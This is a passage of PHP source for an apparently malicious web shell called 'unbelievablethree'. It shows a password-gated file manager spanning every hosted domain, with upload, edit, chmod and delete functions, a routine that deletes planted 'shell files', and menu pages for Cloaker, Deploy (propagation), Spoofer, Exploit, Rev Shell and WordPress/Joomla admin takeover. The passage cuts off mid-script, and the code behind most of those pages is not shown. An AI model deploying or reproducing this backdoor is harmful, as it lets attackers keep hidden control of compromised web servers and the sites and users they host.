            foreach (glob(rtrim($r, '/\\') . '/w_*.php') as $old) { if (@is_file($old) && @unlink($old)) $del++; }
        }
        die('<div style="padding:10px 16px;background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.2);color:#f59e0b;border-radius:8px;font-size:13px;font-family:system-ui;">' . $del . ' shell files deleted.</div>');
    }
    exit;
}

$auth = checkAuth();

if (!empty($GLOBALS['fm_just_logged_in'])) {
    header('Location: ?page=' . urlencode($page));
    exit;
}

if (!isset($auth['authenticated']) || !$auth['authenticated']) {
    $showLogin = true;
    $loginError = isset($auth['error']) ? $auth['error'] : '';
} else {
    $showLogin = false;
}

$fullPath = detectRoot();
if ($page === 'files') {
    $fullPath = resolvePath($path ? $path : detectRoot());
} elseif ($page === 'domainfiles' && $domain) {
    $domains = getDomains();
    foreach ($domains as $d) {
        if ($d['name'] === $domain) { $fullPath = $d['root']; break; }
    }
    if ($path) {
        $sub = fm_path($path);
        if ($sub) $fullPath = resolvePath($sub);
    }
    if (!is_dir($fullPath)) $fullPath = detectRoot();
}
$realFull = realpath($fullPath) ?: $fullPath;
$basePath = ($page === 'domainfiles' && $domain) ? $fullPath : detectRoot();

$pageTitle = 'unbelievablethree';
if ($showLogin) {
    $pageTitle = 'Login - unbelievablethree';
} elseif ($page === 'files') {
    $pageTitle = 'Files - unbelievablethree';
} elseif ($page === 'domainfiles') {
    $pageTitle = $domain . ' - unbelievablethree';
} elseif ($page === 'domains') {
    $pageTitle = 'Domains - unbelievablethree';
} elseif ($page === 'system') {
    $pageTitle = 'System - unbelievablethree';
} elseif ($page === 'cloak') {
    $pageTitle = 'Cloaker - unbelievablethree';
} elseif ($page === 'wpadmin') {
    $pageTitle = 'WP Admin - unbelievablethree';
} elseif ($page === 'propagate') {
    $pageTitle = 'Deploy - unbelievablethree';
} elseif ($page === 'spoofer') {
    $pageTitle = 'Spoofer - unbelievablethree';
} elseif ($page === 'cache') {
    $pageTitle = 'Clear Cache - unbelievablethree';
} elseif ($page === 'plugins') {
    $pageTitle = 'WP Plugins - unbelievablethree';
} elseif ($page === 'exploit') {
    $pageTitle = 'Exploit - unbelievablethree';
} elseif ($page === 'info') {
    $pageTitle = 'Server Info - unbelievablethree';
} elseif ($page === 'revshell') {
    $pageTitle = 'Rev Shell - unbelievablethree';
} elseif ($page === 'edit') {
    $pageTitle = 'Edit - unbelievablethree';
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?php echo htmlspecialchars($pageTitle); ?></title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>
*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
:root {
    --bg:#000; --card:rgba(255,255,255,0.04); --card-border:rgba(255,255,255,0.08);
    --text:#fff; --text-sec:#aaa; --text-ter:#666; --accent:#fff; --danger:#ff3333;
    --sidebar-w:280px; --radius:16px; --radius-sm:10px;
}
body { font-family:'Inter',-apple-system,sans-serif; background:var(--bg); color:var(--text); min-height:100vh; overflow-x:hidden; }
::-webkit-scrollbar { width:6px; height:6px; }
::-webkit-scrollbar-track { background:transparent; }
::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.1); border-radius:3px; }
.sidebar { position:fixed; left:0; top:0; bottom:0; width:var(--sidebar-w); background:#0a0a0a; border-right:1px solid var(--card-border); display:flex; flex-direction:column; z-index:100; transition:transform .3s; overflow:hidden; }
.sidebar-logo { padding:24px 20px; display:flex; align-items:center; gap:12px; border-bottom:1px solid var(--card-border); flex-shrink:0; }
.logo-dot { width:10px; height:10px; background:var(--accent); border-radius:50%; }
.logo-text { font-size:20px; font-weight:800; letter-spacing:3px; color:var(--accent); }
.sidebar-nav { flex:1; overflow-y:auto; padding:12px 0; }
.nav-section { padding:0 12px; margin-bottom:8px; }
.nav-section-title { font-size:10px; font-weight:600; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-ter); padding:8px 12px 6px; }
.nav-link { display:flex; align-items:center; gap:12px; padding:10px 14px; border-radius:var(--radius-sm); color:var(--text-sec); text-decoration:none; font-size:13px; font-weight:500; transition:all .2s; cursor:pointer; }
.nav-link:hover { background:rgba(255,255,255,0.05); color:var(--text); }
.nav-link.active { background:rgba(255,255,255,0.08); color:var(--accent); }
.nav-link i { width:20px; text-align:center; font-size:14px; }
.sidebar-bottom { padding:12px; border-top:1px solid var(--card-border); flex-shrink:0; }
.sidebar-bottom .nav-link { color:var(--text-ter); }
.sidebar-bottom .nav-link:hover { color:var(--danger); }
.main { margin-left:var(--sidebar-w); min-height:100vh; padding:24px 32px; overflow-x:hidden; max-width:calc(100vw - var(--sidebar-w)); }
.main-full { margin-left:0; padding:0; }
.hamburger { display:none; position:fixed; top:16px; left:16px; z-index:200; width:40px; height:40px; border-radius:var(--radius-sm); background:rgba(10,10,20,0.9); border:1px solid var(--card-border); color:var(--text); font-size:18px; cursor:pointer; align-items:center; justify-content:center; }
.overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:90; }
.card { background:var(--card); border:1px solid var(--card-border); border-radius:var(--radius); padding:20px; }
.page-header { margin-bottom:24px; }
.page-title { font-size:24px; font-weight:700; }
.stats-bar { display:flex; align-items:center; gap:16px; padding:10px 16px; background:var(--card); border:1px solid var(--card-border); border-radius:var(--radius-sm); margin-bottom:16px; font-size:12px; color:var(--text-sec); flex-wrap:wrap; }
.stats-bar span { display:flex; align-items:center; gap:4px; }
.stats-bar i { color:var(--text-ter); }
.toolbar { display:flex; align-items:center; gap:10px; margin-bottom:16px; flex-wrap:wrap; }
.search-input { flex:1; min-width:200px; padding:9px 14px 9px 36px; background:var(--card); border:1px solid var(--card-border); border-radius:var(--radius-sm); color:var(--text); font-family:'Inter',sans-serif; font-size:13px; outline:none; }
.search-input:focus { border-color:rgba(255,255,255,0.2); }
.search-wrap { position:relative; flex:1; min-width:200px; }
.search-wrap i { position:absolute; left:12px; top:50%; transform:translateY(-50%); color:var(--text-ter); font-size:13px; }
.btn { display:inline-flex; align-items:center; gap:6px; padding:9px 16px; border:1px solid var(--card-border); border-radius:var(--radius-sm); background:var(--card); color:var(--text); font-family:'Inter',sans-serif; font-size:13px; font-weight:500; cursor:pointer; transition:all .2s; text-decoration:none; white-space:nowrap; }
.btn:hover { background:rgba(255,255,255,0.08); border-color:rgba(255,255,255,0.12); }
.btn-accent { background:rgba(255,255,255,0.08); border-color:rgba(255,255,255,0.15); color:var(--accent); }
.btn-accent:hover { background:rgba(255,255,255,0.14); }
.btn-danger { background:rgba(239,68,68,0.15); border-color:rgba(239,68,68,0.3); color:var(--danger); }
.btn-danger:hover { background:rgba(239,68,68,0.25); }
.btn-sm { padding:5px 10px; font-size:12px; }
.file-table-wrap { overflow-x:auto; border:1px solid var(--card-border); border-radius:var(--radius); background:var(--card); }
.file-table { width:100%; border-collapse:collapse; font-size:13px; }
.file-table th { text-align:left; padding:12px 14px; font-weight:600; font-size:11px; text-transform:uppercase; letter-spacing:1px; color:var(--text-ter); border-bottom:1px solid var(--card-border); white-space:nowrap; }
.file-table td { padding:10px 14px; border-bottom:1px solid rgba(255,255,255,0.02); white-space:nowrap; max-width:400px; overflow:hidden; text-overflow:ellipsis; }
.file-table tr:last-child td { border-bottom:none; }
.file-table tr:hover td { background:rgba(255,255,255,0.02); }
.file-table tr.dir-row { cursor:pointer; }
.file-name { display:flex; align-items:center; gap:10px; }
.file-name .icon { width:20px; text-align:center; font-size:15px; }
.file-actions { display:flex; gap:4px; }
.file-actions .btn { display:inline-flex; align-items:center; gap:4px; white-space:nowrap; }
.file-actions .btn i { font-size:10px; }
.file-actions .btn .btn-label { font-size:10px; font-weight:500; }
.empty-state { text-align:center; padding:60px 20px; color:var(--text-ter); }
.empty-state i { font-size:48px; margin-bottom:16px; opacity:0.3; }
.modal-backdrop { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.7); z-index:500; align-items:center; justify-content:center; }
.modal-backdrop.show { display:flex; }
.modal { background:#111; border:1px solid var(--card-border); border-radius:var(--radius); padding:24px; width:90%; max-width:420px; }
.modal h3 { font-size:16px; font-weight:600; margin-bottom:16px; }
.modal input[type="text"], .modal input[type="password"] { width:100%; padding:10px 14px; background:rgba(255,255,255,0.05); border:1px solid var(--card-border); border-radius:var(--radius-sm); color:var(--text); font-family:'Inter',sans-serif; font-size:13px; outline:none; margin-bottom:12px; }
.modal input:focus { border-color:rgba(255,255,255,0.2); }
.modal-actions { display:flex; gap:8px; justify-content:flex-end; margin-top:8px; }
.login-container { min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; }
.login-card { width:100%; max-width:380px; padding:40px 32px; text-align:center; }
.login-card .logo-dot { width:14px; height:14px; margin:0 auto 12px; }
.login-card .logo-text { font-size:28px; display:block; margin-bottom:8px; }
.login-card .sub { color:var(--text-ter); font-size:13px; margin-bottom:28px; }
.login-card input { width:100%; padding:12px 16px; background:rgba(255,255,255,0.05); border:1px solid var(--card-border); border-radius:var(--radius-sm); color:var(--text); font-family:'Inter',sans-serif; font-size:14px; outline:none; margin-bottom:16px; text-align:center; }
.login-card input:focus { border-color:rgba(255,255,255,0.2); }
.login-card .btn { width:100%; justify-content:center; padding:12px; font-size:14px; }
.login-error { background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.2); border-radius:var(--radius-sm); padding:10px; color:var(--danger); font-size:12px; margin-bottom:16px; }
.editor-container { display:flex; flex-direction:column; border:1px solid var(--card-border); border-radius:var(--radius); overflow:hidden; background:var(--card); }
.editor-topbar { display:flex; align-items:center; gap:12px; padding:10px 16px; background:rgba(255,255,255,0.03); border-bottom:1px solid var(--card-border); flex-shrink:0; }
.editor-topbar .filename { font-size:13px; font-weight:600; flex:1; }
.editor-topbar .back-btn { text-decoration:none; color:var(--text-sec); font-size:12px; display:flex; align-items:center; gap:6px; }
.editor-topbar .back-btn:hover { color:var(--text); }
.editor-textarea { width:100%; height:60vh; padding:16px; background:transparent; border:none; color:var(--text); font-family:'JetBrains Mono',monospace; font-size:13px; line-height:1.5; resize:vertical; outline:none; tab-size:4; }
.editor-statusbar { display:flex; align-items:center; gap:16px; padding:6px 16px; background:rgba(255,255,255,0.03); border-top:1px solid var(--card-border); font-size:11px; color:var(--text-ter); flex-shrink:0; }
.progress-bar { width:100%; height:8px; background:rgba(255,255,255,0.05); border-radius:4px; overflow:hidden; margin:8px 0; }
.progress-fill { height:100%; border-radius:4px; background:var(--accent); }
@media (max-width:768px) {
    .sidebar { transform:translateX(-100%); }
    .sidebar.open { transform:translateX(0); }
    .overlay.show { display:block; }
    .hamburger { display:flex; }
    .main { margin-left:0; padding:20px 16px; padding-top:64px; max-width:100vw; }
    .toolbar { flex-direction:column; }
    .toolbar .btn { width:100%; justify-content:center; }
    .search-wrap { width:100%; }
    .stats-bar { flex-direction:column; align-items:flex-start; gap:4px; }
}
</style>
</head>
<body>
<?php if ($showLogin): ?>
<div class="login-container">
    <div class="card login-card">
        <div class="logo-dot"></div>
        <span class="logo-text">unbelievablethree</span>
        <p class="sub">Sign in to the file manager</p>
        <?php if ($loginError): ?>
            <div class="login-error"><i class="fas fa-exclamation-triangle"></i> <?php echo htmlspecialchars($loginError); ?></div>
        <?php endif; ?>
        <form method="POST">
            <input type="password" name="login_password" placeholder="Password" autofocus required>
            <button type="submit" class="btn btn-accent"><i class="fas fa-arrow-right"></i> Sign In</button>
        </form>
    </div>
</div>
<?php elseif ($page === 'edit' && $fileParam): ?>
<?php
    $editFile = $fileParam;
    $realEdit = null;
    $candidates = [];
    $c1 = $editFile; $candidates[] = $c1;
    $c2 = fm_path($editFile); if ($c2 !== $c1) $candidates[] = $c2;
    $c3 = @realpath($editFile); if ($c3 && $c3 !== $c1 && $c3 !== $c2) $candidates[] = $c3;
    $c4 = rtrim(detectRoot(), '/') . '/' . ltrim(fm_path($editFile), '/'); if ($c4 !== $c1) $candidates[] = $c4;
    if (isset($realFull)) { $c5 = rtrim($realFull, '/') . '/' . basename($editFile); $candidates[] = $c5; }
    $c6 = dirname(__FILE__) . '/' . basename($editFile); if (!in_array($c6, $candidates)) $candidates[] = $c6;
    foreach ($candidates as $ck) { if (@is_file($ck) || @file_exists($ck)) { $realEdit = $ck; break; } }
    if (!$realEdit) { foreach ($candidates as $ck) { $fh = @fopen($ck, 'r'); if ($fh) { fclose($fh); $realEdit = $ck; break; } } }
    if ($realEdit) {
        $editContent = @file_get_contents($realEdit);
        $editName = basename($realEdit);
        $lineCount = substr_count($editContent, "\n") + 1;
        $charCount = strlen($editContent);
        $editType = strtoupper(pathinfo($editName, PATHINFO_EXTENSION)) ?: 'TEXT';
    } else {
        $debugInfo = htmlspecialchars($fileParam) . '<br><small style="color:#666;">' . implode(' | ', array_map('htmlspecialchars', array_slice($candidates, 0, 4))) . '</small>';
        echo '<div class="main-full" style="display:flex;align-items:center;justify-content:center;min-height:100vh;"><div class="card" style="text-align:center;padding:40px;"><i class="fas fa-exclamation-triangle" style="font-size:48px;color:var(--danger);margin-bottom:16px;display:block;"></i><h2>File not found</h2><div style="margin:12px 0;font-size:12px;color:#999;word-break:break-all;">' . $debugInfo . '</div><a href="javascript:history.back()" class="btn" style="margin-top:16px;">Go Back</a></div></div>';
        exit;
    }
?>
<div class="editor-container">
    <div class="editor-topbar">
        <a href="javascript:history.back()" class="back-btn"><i class="fas fa-arrow-left"></i> Back</a>
        <span class="filename"><i class="fas fa-file-code" style="color:var(--text);margin-right:8px;"></i><?php echo htmlspecialchars($editName); ?></span>
        <button class="btn btn-accent btn-sm" id="saveBtn" onclick="saveFile()"><i class="fas fa-save"></i> Save</button>
    </div>
    <textarea class="editor-textarea" id="editorTextarea"><?php echo htmlspecialchars($editContent); ?></textarea>
    <div class="editor-statusbar">
        <span><?php echo $editType; ?></span>
        <span><?php echo $lineCount; ?> lines</span>
        <span><?php echo number_format($charCount); ?> characters</span>
        <span style="flex:1;"></span>
        <span id="saveStatus">Ready</span>
    </div>
</div>
<script>
(function(){
    var ta = document.getElementById('editorTextarea');
    if(ta) {
        ta.addEventListener('keydown', function(e) {
            if(e.key === 'Tab') {
                e.preventDefault();
                var s = this.selectionStart;
                var end = this.selectionEnd;
                this.value = this.value.substring(0,s) + '    ' + this.value.substring(end);
                this.selectionStart = this.selectionEnd = s + 4;
            }
        });
    }
    document.addEventListener('keydown', function(e) {
        if((e.ctrlKey || e.metaKey) && e.key === 's') {
            e.preventDefault();
            saveFile();
        }
    });
})();

function saveFile() {
    var ta = document.getElementById('editorTextarea');
    var status = document.getElementById('saveStatus');
    status.textContent = 'Saving...';
    var fd = new FormData();
    fd.append('action', 'save');
    fd.append('file', '<?php echo addslashes($editFile); ?>');
    fd.append('content', ta.value);
    fd.append('path', '<?php echo addslashes(dirname($editFile)); ?>');
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '', true);
    xhr.onload = function() {
        try {
            var r = JSON.parse(xhr.responseText);
            if(r.ok) status.textContent = 'Saved';
            else status.textContent = 'Error: ' + (r.msg || 'Unknown');
        } catch(ex) {
            status.textContent = 'An error occurred';
        }
    };
    xhr.onerror = function() { status.textContent = 'Network error'; };
    xhr.send(fd);
}
</script>
<?php else: ?>
<button class="hamburger" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button>
<div class="overlay" id="overlay" onclick="toggleSidebar()"></div>
<nav class="sidebar" id="sidebar">
    <div class="sidebar-logo">
        <div class="logo-dot"></div>
        <span class="logo-text">unbelievablethree</span>
    </div>
    <div class="sidebar-nav">
        <?php $sideDomains = getDomains(); $sideW = count(array_filter($sideDomains, function($d) { return $d['writable']; })); $sideR = count($sideDomains) - $sideW; ?>
        <div class="nav-section">
            <div class="nav-section-title">Main Menu</div>
            <a href="?page=files" class="nav-link <?php echo $page==='files'||$page==='domainfiles'?'active':''; ?>">
                <i class="fas fa-folder-open"></i> Files
            </a>
            <a href="?page=domains" class="nav-link <?php echo $page==='domains'?'active':''; ?>">
                <i class="fas fa-globe"></i> Domain Panel
                <span style="margin-left:auto;display:flex;gap:4px;padding-right:2px;">
                    <span style="padding:1px 7px;border-radius:10px;font-size:10px;font-weight:700;background:rgba(34,197,94,.12);color:#22c55e;border:1px solid rgba(34,197,94,.2);"><?php echo $sideW; ?></span>
                    <span style="padding:1px 7px;border-radius:10px;font-size:10px;font-weight:700;background:rgba(239,68,68,.12);color:#ef4444;border:1px solid rgba(239,68,68,.2);"><?php echo $sideR; ?></span>
                </span>
            </a>
            <a href="?page=system" class="nav-link <?php echo $page==='system'?'active':''; ?>" style="color:var(--text-ter);">
                <i class="fas fa-server"></i> System
            </a>
        </div>
        <div class="nav-section">
            <div class="nav-section-title">WordPress</div>
            <a href="?page=wpadmin" class="nav-link <?php echo $page==='wpadmin'?'active':''; ?>" style="color:#fff;">
                <i class="fab fa-wordpress"></i> WP Admin
            </a>
            <a href="?page=jmadmin" class="nav-link <?php echo $page==='jmadmin'?'active':''; ?>" style="color:#fff;">
                <i class="fab fa-joomla"></i> Joomla Admin
            </a>
            <a href="?page=plugins" class="nav-link <?php echo $page==='plugins'?'active':''; ?>">
                <i class="fas fa-puzzle-piece"></i> WP Plugins
            </a>
            <a href="?page=cache" class="nav-link <?php echo $page==='cache'?'active':''; ?>">
                <i class="fas fa-broom"></i> Clear Cache
            </a>
        </div>
        <div class="nav-section">
            <div class="nav-section-title">Tools</div>
            <a href="?page=cloak" class="nav-link <?php echo $page==='cloak'?'active':''; ?>">
                <i class="fas fa-mask"></i> Cloaker
            </a>
            <a href="?page=propagate" class="nav-link <?php echo $page==='propagate'?'active':''; ?>">
                <i class="fas fa-rocket"></i> Deploy
            </a>
            <a href="?page=spoofer" class="nav-link <?php echo $page==='spoofer'?'active':''; ?>">
                <i class="fas fa-clock"></i> Spoofer
            </a>
            <a href="?page=exploit" class="nav-link <?php echo $page==='exploit'?'active':''; ?>">
                <i class="fas fa-bug"></i> Exploit
            </a>
            <a href="?page=revshell" class="nav-link <?php echo $page==='revshell'?'active':''; ?>">
                <i class="fas fa-plug"></i> Rev Shell
            </a>
            <a href="?page=info" class="nav-link <?php echo $page==='info'?'active':''; ?>">
                <i class="fas fa-heart-pulse"></i> Server Info
            </a>
        </div>
    </div>
    <div class="sidebar-bottom">
        <a href="?page=logout" class="nav-link">
            <i class="fas fa-sign-out-alt"></i> Logout
        </a>
    </div>
</nav>

<div class="main" id="mainContent">
<?php if ($page === 'files' || $page === 'domainfiles'): ?>
<?php
    $entries = @scandir($realFull);
    if (!$entries) $entries = [];
    $dirs = [];
    $files = [];
    foreach ($entries as $e) {
        if ($e === '.' || $e === '..') continue;
        $full = rtrim($realFull, '/') . '/' . $e;
        if (!file_exists($full)) continue;
        if (is_dir($full)) {
            $dirs[] = $e;
        } else {
            $files[] = $e;
        }
    }
    sort($dirs, SORT_STRING | SORT_FLAG_CASE);
    sort($files, SORT_STRING | SORT_FLAG_CASE);
    $totalSize = 0;
    $totalFiles = count($files);
    $totalDirs = count($dirs);
    foreach ($files as $f) {
        $sz = @filesize($realFull . '/' . $f);
        if ($sz) $totalSize += $sz;
    }
    $pageUrl = $page === 'domainfiles' ? '?page=domainfiles&domain=' . urlencode($domain) : '?page=files';
    $fullDisplayPath = rtrim($realFull, '/');
?>
<div style="padding:10px 16px;background:var(--card);border:1px solid var(--card-border);border-radius:var(--radius-sm);margin-bottom:10px;display:flex;align-items:center;gap:8px;font-family:'JetBrains Mono',monospace;font-size:12px;overflow:hidden;">
    <i class="fas fa-folder-open" style="color:var(--text);font-size:14px;flex-shrink:0;"></i>
    <span style="color:var(--text-ter);font-size:11px;flex-shrink:0;" title="Full directory path"><?php echo htmlspecialchars($fullDisplayPath); ?></span>
</div>
<div style="padding:6px 16px;background:rgba(255,255,255,0.02);border:1px solid var(--card-border);border-top:none;border-radius:0 0 var(--radius-sm) var(--radius-sm);margin-bottom:10px;display:flex;align-items:center;gap:4px;font-family:'JetBrains Mono',monospace;font-size:12px;overflow:hidden;">
    <a href="<?php echo $pageUrl . '&path=' . urlencode(detectRoot()); ?>" style="color:var(--text);text-decoration:none;flex-shrink:0;font-size:12px;display:flex;align-items:center;gap:4px;" title="<?php echo htmlspecialchars(detectRoot()); ?>"><i class="fas fa-home"></i><span style="font-size:10px;color:var(--text-ter);font-family:'Inter',sans-serif;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;"><?php echo htmlspecialchars(basename(detectRoot())); ?></span></a>
    <?php
    $crumbs = explode('/', $realFull);
    $crumbPath = '';
    foreach ($crumbs as $ci => $crumb):
        if ($ci === 0 && $crumb === '') { $crumbPath = ''; continue; }
        $crumbPath .= '/' . $crumb;
        $isLast = ($ci === count($crumbs) - 1);
    ?>
    <span style="color:var(--text-ter);font-size:10px;">/</span>
    <?php if ($isLast): ?>
    <span style="color:var(--text);font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="<?php echo htmlspecialchars($crumb); ?>"><?php echo htmlspecialchars($crumb); ?></span>
    <?php else: ?>
    <a href="<?php echo $pageUrl . '&path=' . urlencode($crumbPath); ?>" style="color:var(--text-sec);text-decoration:none;font-weight:500;" onmouseover="this.style.color='#fff'" onmouseout="this.style.color='var(--text-sec)'"><?php echo htmlspecialchars($crumb); ?></a>
    <?php endif; ?>
    <?php endforeach; ?>
    <span style="margin-left:auto;color:var(--text-ter);font-size:10px;font-family:'Inter',sans-serif;flex-shrink:0;padding-left:8px;"><?php echo $totalDirs; ?> dirs, <?php echo $totalFiles; ?> files, <?php echo formatSize($totalSize); ?></span>
</div>

    <div class="toolbar" style="margin-bottom:10px;">
        <div class="search-wrap">
            <i class="fas fa-search"></i>
            <input type="text" class="search-input" placeholder="Search..." id="searchInput" oninput="filterFiles()">
        </div>
        <button class="btn btn-accent" onclick="openModal('mkdirModal')"><i class="fas fa-folder-plus"></i> Folder</button>
        <button class="btn" onclick="openModal('uploadModal')"><i class="fas fa-cloud-upload-alt"></i> Upload</button>
    </div>

<div class="file-table-wrap">
    <table class="file-table" id="fileTable">
        <thead>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Date</th>
                <th>Permissions</th>
                <th></th>
            </tr>
        </thead>
        <tbody>
            <?php
            $parentDir = dirname(rtrim($realFull, '/'));
            $rootDir = $page === 'domainfiles' ? ($basePath) : detectRoot();
            ?>
            <?php if (rtrim($realFull, '/') !== rtrim($rootDir, '/')): ?>
            <tr class="dir-row">
                <td><a href="<?php echo $pageUrl . '&path=' . urlencode($parentDir); ?>" class="file-name" style="text-decoration:none;color:var(--text);"><span class="icon" style="color:var(--text);"><i class="fas fa-arrow-up"></i></span> ..</a></td>
                <td>-</td><td>-</td><td>-</td><td></td>
            </tr>
            <?php endif; ?>
            <?php foreach ($dirs as $d): ?>
            <?php $dPerms = @fileperms($realFull . '/' . $d); $dPc = fm_permColor($dPerms); $dOct = substr(sprintf('%o', $dPerms), -4); ?>
            <tr class="dir-row">
                <td><a href="<?php echo $pageUrl . '&path=' . urlencode(rtrim($realFull, '/') . '/' . $d); ?>" class="file-name" style="text-decoration:none;color:var(--text);"><span class="icon" style="color:var(--text);"><i class="fas fa-folder"></i></span> <span class="file-name-text"><?php echo htmlspecialchars($d); ?>/</span></a></td>
                <td>-</td>
                <td><?php echo formatDate(@filemtime($realFull . '/' . $d)); ?></td>
                <td style="color:<?php echo $dPc; ?>;font-family:monospace;font-weight:600;" title="Perm: <?php echo $dOct; ?>"><?php echo $dOct; ?></td>
                <td>
                    <div class="file-actions">
                        <button class="btn btn-sm" onclick="renameEntry('<?php echo htmlspecialchars(addslashes($d)); ?>')" title="Rename"><i class="fas fa-pen"></i> <span class="btn-label">Rename</span></button>
                        <button class="btn btn-sm" onclick="chmodEntry('<?php echo htmlspecialchars(addslashes($d)); ?>')" title="Change Permissions"><i class="fas fa-lock"></i> <span class="btn-label">Perms</span></button>
                        <button class="btn btn-sm btn-danger" onclick="deleteEntry('<?php echo htmlspecialchars(addslashes($d)); ?>')" title="Delete"><i class="fas fa-trash"></i> <span class="btn-label">Delete</span></button>
                    </div>
                </td>
            </tr>
            <?php endforeach; ?>
            <?php foreach ($files as $f): ?>
            <?php $icon = getFileIcon($f); $fPerms = @fileperms(rtrim($realFull, '/') . '/' . $f); $fPc = fm_permColor($fPerms); $fOct = substr(sprintf('%o', $fPerms), -4); ?>
            <tr>
                <td>
                    <div class="file-name">
                        <span class="icon" style="color:<?php echo $icon[1]; ?>;"><i class="<?php echo $icon[0]; ?>"></i></span>
                        <?php if (isEditable($f)): ?>
                        <a href="?page=edit&file=<?php echo urlencode(rtrim($realFull, '/') . '/' . $f); ?><?php echo $page === 'domainfiles' ? '&domain=' . urlencode($domain) : ''; ?>" style="color:var(--text);text-decoration:none;" class="file-name-text"><?php echo htmlspecialchars($f); ?></a>
                        <?php else: ?>
                        <span class="file-name-text"><?php echo htmlspecialchars($f); ?></span>
                        <?php endif; ?>
                    </div>
                </td>
                <td><?php echo formatSize(@filesize(rtrim($realFull, '/') . '/' . $f)); ?></td>
                <td><?php echo formatDate(@filemtime(rtrim($realFull, '/') . '/' . $f)); ?></td>
                <td style="color:<?php echo $fPc; ?>;font-family:monospace;font-weight:600;" title="Perm: <?php echo $fOct; ?>"><?php echo $fOct; ?></td>
                <td>
                    <div class="file-actions">
                        <?php if (isEditable($f)): ?>
                        <a href="?page=edit&file=<?php echo urlencode(rtrim($realFull, '/') . '/' . $f); ?><?php echo $page === 'domainfiles' ? '&domain=' . urlencode($domain) : ''; ?>" class="btn btn-sm" title="Edit"><i class="fas fa-edit"></i> <span class="btn-label">Edit</span></a>
                        <?php endif; ?>
                        <button class="btn btn-sm" onclick="renameEntry('<?php echo htmlspecialchars(addslashes($f)); ?>')" title="Rename"><i class="fas fa-pen"></i> <span class="btn-label">Rename</span></button>
                        <button class="btn btn-sm btn-danger" onclick="deleteEntry('<?php echo htmlspecialchars(addslashes($f)); ?>')" title="Delete"><i class="fas fa-trash"></i> <span class="btn-label">Delete</span></button>
                    </div>
                </td>
            </tr>
            <?php endforeach; ?>
            <?php if (empty($dirs) && empty($files)): ?>
            <tr>
                <td colspan="5">
                    <div class="empty-state">
                        <i class="fas fa-folder-open"></i>
                        <p>This folder is empty</p>
                    </div>
                </td>
            </tr>
            <?php endif; ?>
        </tbody>
    </table>
</div>

<div class="modal-backdrop" id="mkdirModal">
    <div class="modal">
        <h3><i class="fas fa-folder-plus" style="color:var(--accent);margin-right:8px;"></i> New Folder</h3>
        <input type="text" id="mkdirInput" placeholder="Folder name" autofocus>
        <div class="modal-actions">
            <button class="btn" onclick="closeModal('mkdirModal')">Cancel</button>
            <button class="btn btn-accent" onclick="doMkdir()"><i class="fas fa-plus"></i> Create</button>
        </div>
    </div>
</div>

<div class="modal-backdrop" id="uploadModal">
    <div class="modal">
        <h3><i class="fas fa-cloud-upload-alt" style="color:var(--text);margin-right:8px;"></i> Upload File</h3>
        <input type="file" id="uploadFile" style="display:none;" onchange="doUpload()">
        <button class="btn" style="width:100%;justify-content:center;padding:20px;" onclick="document.getElementById('uploadFile').click()">
            <i class="fas fa-cloud-upload-alt" style="font-size:24px;"></i>
            <span>Select or drop a file</span>
        </button>
        <div id="uploadProgress" style="margin-top:12px;display:none;">
            <div class="progress-bar"><div class="progress-fill" id="uploadBar" style="width:0%;"></div></div>
            <p style="font-size:11px;color:var(--text-ter);text-align:center;" id="uploadStatus">Uploading...</p>
        </div>
        <div class="modal-actions" style="margin-top:12px;">
            <button class="btn" onclick="closeModal('uploadModal')">Close</button>
        </div>
    </div>
</div>

<div class="modal-backdrop" id="renameModal">
    <div class="modal">
        <h3><i class="fas fa-pen" style="color:var(--text);margin-right:8px;"></i> Rename</h3>
        <input type="text" id="renameOld" style="display:none;">
        <input type="text" id="renameNew" placeholder="New name" autofocus>
        <div class="modal-actions">
            <button class="btn" onclick="closeModal('renameModal')">Cancel</button>
            <button class="btn" onclick="doRename()"><i class="fas fa-check"></i> Save</button>
        </div>
    </div>
</div>

<div class="modal-backdrop" id="deleteModal">
    <div class="modal">
        <h3><i class="fas fa-trash" style="color:var(--danger);margin-right:8px;"></i> Confirm Delete</h3>
        <p style="color:var(--text-sec);font-size:13px;margin-bottom:16px;"><strong id="deleteName"></strong> will be deleted. Are you sure?</p>
        <input type="hidden" id="deleteTarget">
        <div class="modal-actions">
            <button class="btn" onclick="closeModal('deleteModal')">Cancel</button>
            <button class="btn btn-danger" onclick="doDelete()"><i class="fas fa-trash"></i> Delete</button>
        </div>
    </div>
</div>

<div class="modal-backdrop" id="chmodModal">
    <div class="modal">
        <h3><i class="fas fa-lock" style="color:var(--text-ter);margin-right:8px;"></i> Change Permissions</h3>
        <input type="hidden" id="chmodTarget">
        <input type="text" id="chmodPerms" placeholder="e.g. 755, 644" maxlength="4">
        <div class="modal-actions">
            <button class="btn" onclick="closeModal('chmodModal')">Cancel</button>
            <button class="btn btn-accent" onclick="doChmod()"><i class="fas fa-check"></i> Apply</button>
        </div>
    </div>
</div>

<script>
var currentPath = '<?php echo addslashes(rtrim($realFull, '/')); ?>';
var pageMode = '<?php echo $page; ?>';
var domainParam = '<?php echo addslashes($domain); ?>';

function toggleSidebar() {
    document.getElementById('sidebar').classList.toggle('open');
    document.getElementById('overlay').classList.toggle('show');
}

function openModal(id) {
    document.getElementById(id).classList.add('show');
    var inp = document.getElementById(id).querySelector('input[type="text"]');
